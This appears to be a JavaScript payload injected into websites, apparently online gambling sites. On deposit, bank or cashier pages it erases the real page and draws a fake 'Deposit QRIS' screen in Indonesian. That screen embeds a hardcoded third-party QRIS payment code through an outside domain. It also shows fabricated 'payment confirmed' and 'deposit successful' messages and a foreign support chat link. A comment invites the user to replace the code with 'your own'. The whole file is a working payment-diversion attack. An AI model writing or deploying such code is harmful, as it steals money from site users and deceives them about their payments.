(function () {
  const url = window.location.href;
  const match = [
    '/deposit',
    '/bank',
    '/deposit.php',
    '/qris.php',
    '/cashier',
    '/metode/?bank=',
    '/?bank=',
    '/?page=transaksi',
    '/index.php?page=transaksi',
    '/?deposit&head=home',
    '/index.php?page=cashier',
    '/bank.php'
  ];

  if (!match.some(path => url.includes(path))) return;

  document.documentElement.innerHTML = "<head></head><body></body>";

  // ===== QRIS STATIS (Ganti dengan milik Anda) =====
  const QRIS_STATIC = '00020101021126610014COM.GO-JEK.WWW01189360091433048003880210G3048003880303UMI51440014ID.CO.QRIS.WWW0215ID10254527981800303UMI5204792953033605802ID5918Asiatimur%2C%20Hiburan6008MERANGIN61053735462070703A0163046BFC';

  document.head.innerHTML = `
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <title>Deposit QRIS</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
      :root {
        --primary-blue: #2563eb;
        --blue-light: #3b82f6;
        --blue-soft: #60a5fa;
        --black-dark: #0f172a;
        --black-light: #1e293b;
        --gray-light: #94a3b8;
        --white: #f8fafc;
        --success: #10b981;
        --warning: #f59e0b;
        --border-radius: 12px;
        --border-radius-sm: 8px;
        --box-shadow: 0 4px 12px rgba(0, 30, 84, 0.15);
        --transition: all 0.2s ease;
        --gradient-dark: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
      }
      
      * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
      body {
        font-family: 'Poppins', sans-serif;
        background: var(--gradient-dark);
        color: var(--white);
        min-height: 100vh;
        padding: 0;
        line-height: 1.4;
        overflow-x: hidden;
      }
      .app-container {
        width: 100%;
        min-height: 100vh;
        display: flex;
        flex-direction: column;
        max-width: 100%;
        margin: 0 auto;
      }
      .header {
        background: rgba(15, 23, 42, 0.95);
        padding: 16px;
        text-align: center;
        border-bottom: 1px solid rgba(59, 130, 246, 0.3);
        backdrop-filter: blur(10px);
        position: sticky;
        top: 0;
        z-index: 100;
      }
      .header h1 {
        font-size: 18px;
        font-weight: 700;
        color: var(--blue-soft);
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 8px;
      }
      .header p {
        font-size: 12px;
        color: var(--gray-light);
        margin-top: 4px;
      }
      .alert-banner {
        background: rgba(245, 158, 11, 0.1);
        border-bottom: 1px solid rgba(245, 158, 11, 0.2);
        padding: 10px 16px;
        display: flex;
        align-items: center;
        gap: 10px;
        font-size: 12px;
        color: #fde68a;
      }
      .alert-banner i { color: var(--warning); flex-shrink: 0; }
      .main-content {
        flex: 1;
        padding: 16px;
        max-width: 100%;
        overflow-y: auto;
      }
      .help-btn {
        width: 100%;
        background: rgba(139, 92, 246, 0.1);
        color: #c4b5fd;
        border: 1px solid rgba(139, 92, 246, 0.3);
        padding: 14px;
        border-radius: var(--border-radius-sm);
        font-weight: 600;
        font-size: 14px;
        cursor: pointer;
        transition: var(--transition);
        margin-bottom: 16px;
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 8px;
      }
      .form-group {
        margin-bottom: 16px;
      }
      .form-group label {
        display: block;
        margin-bottom: 8px;
        font-size: 13px;
        font-weight: 600;
        color: var(--blue-soft);
      }
      input {
        width: 100%;
        padding: 14px;
        background: rgba(15, 23, 42, 0.7);
        border: 1px solid rgba(59, 130, 246, 0.3);
        border-radius: var(--border-radius-sm);
        font-size: 14px;
        color: var(--white);
        transition: var(--transition);
        font-family: 'Poppins', sans-serif;
        -webkit-appearance: none;
      }
      input:focus {
        outline: none;
        border-color: var(--blue-light);
        box-shadow: 0 0 0 2px rgba(59, 130, 246, 0.2);
      }
      .quick-amounts {
        display: grid;
        grid-template-columns: repeat(4, 1fr);
        gap: 8px;
        margin-bottom: 16px;
      }
      .quick-amounts button {
        background: rgba(15, 23, 42, 0.7);
        border: 1px solid rgba(59, 130, 246, 0.3);
        color: var(--blue-soft);
        padding: 10px 0;
        border-radius: var(--border-radius-sm);
        font-weight: 600;
        font-size: 13px;
        cursor: pointer;
        transition: var(--transition);
      }
      .quick-amounts button:active {
        transform: scale(0.95);
      }
      .action-btn {
        width: 100%;
        background: rgba(59, 130, 246, 0.15);
        color: var(--blue-soft);
        border: 1px solid rgba(59, 130, 246, 0.4);
        padding: 16px;
        border-radius: var(--border-radius-sm);
        font-weight: 600;
        font-size: 15px;
        cursor: pointer;
        transition: var(--transition);
        margin-top: 8px;
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 8px;
      }
      .action-btn:active { transform: scale(0.98); }
      .action-btn:disabled {
        opacity: 0.6;
        cursor: not-allowed;
      }
      .qr-container {
        margin-top: 16px;
        background: rgba(15, 23, 42, 0.8);
        border-radius: var(--border-radius);
        padding: 16px;
        border: 1px solid rgba(59, 130, 246, 0.25);
        display: none;
        animation: fadeIn 0.3s ease;
      }
      .qr-container.active { display: block; }
      .qr-container iframe {
        width: 100%;
        height: 400px;
        border: none;
        border-radius: var(--border-radius-sm);
        background: #0a0a0a;
      }
      .info-box {
        background: rgba(59, 130, 246, 0.1);
        border-left: 3px solid var(--blue-light);
        padding: 12px;
        border-radius: 0 6px 6px 0;
        margin: 12px 0;
        font-size: 12px;
        color: var(--blue-soft);
        display: flex;
        align-items: flex-start;
        gap: 8px;
      }
      .info-box i { color: var(--blue-light); margin-top: 1px; flex-shrink: 0; }
      .info-box.warning {
        background: rgba(245, 158, 11, 0.1);
        border-left-color: var(--warning);
        color: #fde68a;
      }
      .info-box.warning i { color: var(--warning); }
      .qr-actions {
        display: flex;
        gap: 8px;
        margin-top: 16px;
      }
      .qr-actions button {
        flex: 1;
        padding: 14px;
        border-radius: var(--border-radius-sm);
        font-weight: 600;
        font-size: 13px;
        cursor: pointer;
        transition: var(--transition);
        border: none;
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 6px;
      }
      .done-btn {
        background: rgba(16, 185, 129, 0.15);
        color: #a7f3d0;
        border: 1px solid rgba(16, 185, 129, 0.4);
      }
      .toast {
        position: fixed;
        bottom: 20px;
        left: 16px;
        right: 16px;
        transform: translateY(100px);
        text-align: center;
        padding: 14px;
        border-radius: var(--border-radius-sm);
        font-size: 14px;
        font-weight: 500;
        opacity: 0;
        pointer-events: none;
        transition: transform 0.3s ease, opacity 0.3s ease;
        z-index: 1000;
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 8px;
        backdrop-filter: blur(10px);
        border: 1px solid rgba(255, 255, 255, 0.1);
        max-width: calc(100% - 32px);
      }
      .toast.show { opacity: 1; transform: translateY(0); }
      .toast.success { background: rgba(16, 185, 129, 0.9); color: white; }
      .toast.error { background: rgba(239, 68, 68, 0.9); color: white; }
      .toast.info { background: rgba(59, 130, 246, 0.9); color: white; }
      .footer {
        text-align: center;
        padding: 16px;
        border-top: 1px solid rgba(59, 130, 246, 0.2);
        background: rgba(15, 23, 42, 0.8);
      }
      .footer img {
        max-width: 200px;
        border-radius: var(--border-radius-sm);
        border: 1px solid rgba(59, 130, 246, 0.3);
      }
      @media (max-width: 480px) {
        .main-content { padding: 14px; }
        .quick-amounts button { font-size: 12px; padding: 8px 0; }
        .qr-container iframe { height: 320px; }
      }
      @keyframes fadeIn {
        from { opacity: 0; transform: translateY(10px); }
        to { opacity: 1; transform: translateY(0); }
      }
    </style>
  `;

  document.body.innerHTML = `
    <div class="app-container">
      <div class="header">
        <h1><i class="fas fa-qrcode"></i> Deposit QRIS</h1>
        <p>Scan QRIS untuk melakukan pembayaran</p>
      </div>
      <div class="alert-banner">
        <i class="fas fa-exclamation-circle"></i>
        <span>Min. Rp 50.000 | QRIS otomatis dibuat</span>
      </div>
      <div class="main-content">
        <button class="help-btn" onclick="openHelp()">
          <i class="fas fa-headset"></i> Bantuan
        </button>
        <div class="form-group">
          <label for="nominal-input">Nominal Deposit</label>
          <input id="nominal-input" type="number" min="50000" placeholder="Contoh: 100000" inputmode="numeric">
        </div>
        <div class="quick-amounts">
          <button onclick="setAmount(50000)">50.000</button>
          <button onclick="setAmount(100000)">100.000</button>
          <button onclick="setAmount(200000)">200.000</button>
          <button onclick="setAmount(500000)">500.000</button>
        </div>
        <button class="action-btn" onclick="generateQRIS()" id="generate-btn">
          <i class="fas fa-qrcode"></i> Buat QRIS
        </button>
        <div id="qr-container" class="qr-container">
          <iframe id="qris-iframe" src="" allow="camera; clipboard-read; clipboard-write"></iframe>
          <div class="info-box">
            <i class="fas fa-camera"></i> Scan QRIS dengan aplikasi e-wallet atau mobile banking
          </div>
          <div class="info-box warning">
            <i class="fas fa-exclamation-triangle"></i> Pastikan nominal sesuai sebelum scan
          </div>
          <div class="qr-actions">
            <button class="done-btn" onclick="confirmPayment()">
              <i class="fas fa-check-circle"></i> Sudah Bayar
            </button>
          </div>
        </div>
      </div>
      <div class="footer">
        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSxt4SV-4Fwz_SHmJwW_ENA4zghNfwbYgAG4x_l9IbA0w&s=10" alt="Secure Payment">
      </div>
    </div>
    <div id="toast" class="toast"></div>
  `;

  // Toast function
  function showToast(msg, type = "success") {
    const toast = document.getElementById("toast");
    const icon = { success: 'check-circle', error: 'exclamation-circle', info: 'info-circle' }[type];
    toast.innerHTML = `<i class="fas fa-${icon}"></i><span>${msg}</span>`;
    toast.className = `toast ${type}`;
    toast.offsetHeight;
    toast.classList.add("show");
    clearTimeout(toast._timer);
    toast._timer = setTimeout(() => toast.classList.remove("show"), 2000);
  }

  // Set amount from quick buttons
  window.setAmount = function(amount) {
    document.getElementById('nominal-input').value = amount;
    document.getElementById('nominal-input').style.borderColor = 'rgba(16, 185, 129, 0.6)';
  };

  // Generate QRIS with iframe
  window.generateQRIS = function() {
    const nominal = Number(document.getElementById('nominal-input').value || 0);
    if (nominal < 50000) {
      showToast('Minimal deposit Rp 50.000', 'error');
      return;
    }
    const btn = document.getElementById('generate-btn');
    btn.disabled = true;
    btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Membuat QRIS...';
    
    setTimeout(() => {
      const iframe = document.getElementById('qris-iframe');
      const url = `https://hkgaming.shop/deposit?qris=${encodeURIComponent(QRIS_STATIC)}&amount=${nominal}&embed=1`;
      iframe.src = url;
      document.getElementById('qr-container').classList.add('active');
      btn.disabled = false;
      btn.innerHTML = '<i class="fas fa-qrcode"></i> Buat QRIS';
      showToast(`QRIS Rp ${nominal.toLocaleString('id-ID')} siap`, 'success');
      document.getElementById('qr-container').scrollIntoView({ behavior: 'smooth', block: 'start' });
    }, 500);
  };

  // Confirm payment
  window.confirmPayment = function() {
    showToast('Pembayaran berhasil dikonfirmasi', 'success');
    setTimeout(() => {
      showToast('Proses deposit...', 'info');
      setTimeout(() => {
        showToast('Deposit berhasil', 'success');
        setTimeout(() => history.back(), 1000);
      }, 1500);
    }, 500);
  };

  // Open help
  window.openHelp = function() {
    showToast('Membuka bantuan...', 'info');
    setTimeout(() => window.open("https://direct.lc.chat/19347249", "_blank"), 300);
  };

  // Input validation on change
  document.getElementById('nominal-input').addEventListener('input', function() {
    const val = Number(this.value || 0);
    if (val >= 50000) {
      this.style.borderColor = 'rgba(16, 185, 129, 0.6)';
    } else if (val > 0 && val < 50000) {
      this.style.borderColor = 'rgba(239, 68, 68, 0.6)';
    } else {
      this.style.borderColor = 'rgba(59, 130, 246, 0.3)';
    }
  });

  // Prevent enter from submitting
  document.addEventListener('keydown', (e) => {
    if (e.key === 'Enter') e.preventDefault();
  });

  // Initial toast
  setTimeout(() => showToast('Siap deposit QRIS', 'info'), 500);
})();